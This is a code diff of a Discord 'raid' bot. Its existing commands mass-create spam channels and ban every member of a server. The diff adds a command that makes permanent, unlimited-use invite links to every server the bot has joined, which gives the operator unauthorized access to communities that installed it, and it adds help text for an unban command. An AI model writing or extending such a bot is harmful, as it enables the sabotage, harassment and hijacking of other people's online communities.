@@ -1,9 +1,14 @@
 import discord
 from discord.ext import commands
+from discord.ui import View, Button
 import asyncio
 import aiohttp
+import os
+import sys
 from datetime import datetime
+import webserver
 import warnings
+import logging
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 
 
@@ -45,6 +50,48 @@ async def ret(ctx, cantidad: int = 100):
 
     tareas_crear = [crear_y_spamear(i) for i in range(1, cantidad + 1)]
     await asyncio.gather(*tareas_crear, return_exceptions=True)
+
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def sv(ctx):
+    allowed_ids = [IDS USERS] # In "IDs Users" you have to put the users who can use this command, so that you write it there it should be like [1426720039909724292, 1395678169402445825]
+
+    if ctx.author.id not in allowed_ids:
+        await ctx.send("You do not have permission to use the command.")
+        return
+    
+    descripcion = ""
+
+    for guild in bot.guilds:
+        channel = next((c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite), None)
+
+        if channel:
+            try:
+                invite = await channel.create_invite(max_age=0, max_uses=0)
+                descripcion += (
+                    f"📌 **{guild.name}**\n"
+                    f"👥 Users: {guild.member_count}\n"
+                    f"Invitation: {invite.url}\n\n"
+                )
+            except Exception as e:
+                descripcion += (
+                    f"📌 **{guild.name}**\n"
+                    f"👥 Users: {guild.member_count}\n"
+                    f"⚠️ Invitation could not be created: {e}\n\n"
+                )
+        else:
+            descripcion += (
+                f"📌 **{guild.name}**\n"
+                f"👥 Users: {guild.member_count}\n"
+                f"⚠️ There is no channel with permissions to create invitations.\n\n"
+            )
+
+    embed = discord.Embed(
+        title="🌐 Servidores donde está el bot",
+        description=descripcion if descripcion else "No se encontraron servidores.",
+        color=discord.Color.blue()
+    )
+    await ctx.send(embed=embed)
 
 @bot.command()
 @commands.has_permissions(administrator=True)
@@ -425,6 +472,8 @@ paginas = [
             "**Raidea creating many channels with spam.**\n"
             "`$bn` –\n"
             "**Ban all members except bots with admin privileges.**\n"
+            "`$db (USER ID` –\n"
+            "**Unban a user using their ID only if the bot is on the serve.**\n"
         )
     },
     {
